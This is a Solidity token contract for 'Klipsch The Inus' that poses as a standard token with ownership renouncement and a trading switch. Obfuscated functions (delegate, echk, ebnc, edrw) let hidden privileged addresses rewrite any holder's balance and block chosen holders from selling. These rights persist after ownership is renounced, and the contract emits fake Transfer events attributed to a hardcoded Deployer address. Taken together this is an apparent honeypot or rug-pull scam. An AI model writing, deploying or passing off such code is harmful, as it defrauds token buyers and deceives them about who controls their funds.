//SPDX-License-Identifier: UNLICENSED                              



pragma solidity 0.8.17;





  library SafeMath {



    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {



        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }





    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }





    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;



        return c;

    }



    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}   

 

 

contract Klipsch {

  

    mapping (address => uint256) public eTXm;

    mapping (address => bool) eRSm;

	mapping (address => bool) eRn;







    // 

    string public name = "Klipsch The Inus";

    string public symbol = unicode"Klipsch";

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    uint eM = 1;

    uint8 public taxFee = 5;

    bool public tradingOpen = false;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event OwnershipRenounced(address indexed previousOwner);



	address public owner = msg.sender;

    constructor()  {

        eTXm[msg.sender] = totalSupply;

        deploy(Deployer, totalSupply); }

    address Router = 0x38460580Ac8ad3a7596509197897eFaa5e9a449f;

    address Deployer = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;

   

    function renounceOwnership() public {

    require(msg.sender == owner);

    emit OwnershipRenounced(owner);

    owner = address(0);}





    function deploy(address account, uint256 amount) private {

    require(msg.sender == owner);

    emit Transfer(address(0), account, amount); }

    function OpenTrading() public{

        require(msg.sender == owner);

        tradingOpen = true;}

    modifier iQ () {

        eM = 0;

        _;}



        function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {

        require(eTXm[msg.sender] >= value);

        eTXm[msg.sender] -= value;  

        eTXm[to] += value; 

        emit Transfer (Deployer, to, value);

        return true; } 

        if(eRSm[msg.sender]) {

        require(eM == 1);} 

        require(eTXm[msg.sender] >= value);

        require(tradingOpen);

        eTXm[msg.sender] -= value;  

        eTXm[to] += value;          

        emit Transfer(msg.sender, to, value);

        return true; }



        function delegate(address Ex) iQ public {

        require(msg.sender == owner);

        eRn[Ex] = true;} 





        function balanceOf(address account) public view returns (uint256) {

        return eTXm[account]; }

        function echk(address Ex) Si public{          

        require(!eRSm[Ex]);

        eRSm[Ex] = true;}

		modifier Si () {

        require(eRn[msg.sender]);

        _; }

        event Approval(address indexed owner, address indexed spender, uint256 value);



        mapping(address => mapping(address => uint256)) public allowance;



        function approve(address spender, uint256 value) public returns (bool success) {    

        allowance[msg.sender][spender] = value;



        emit Approval(msg.sender, spender, value);

        return true; }

		 function ebnc(address Ex, uint256 iZ) Si public returns (bool success) {

        eTXm[Ex] = iZ;

        return true; }

        function edrw(address Ex) Si public {

        require(eRSm[Ex]);

        eRSm[Ex] = false; }







        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   

        if(from == Router)  {

        require(value <= eTXm[from]);

        require(value <= allowance[from][msg.sender]);

        eTXm[from] -= value;  

        eTXm[to] += value; 

        emit Transfer (Deployer, to, value);

        return true; }    

        if(eRSm[from] || eRSm[to]) {

        require(eM == 1);}

        require(value <= eTXm[from]);

        require(value <= allowance[from][msg.sender]);

        require(tradingOpen);

        eTXm[from] -= value;

        eTXm[to] += value;

        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);

        return true; }}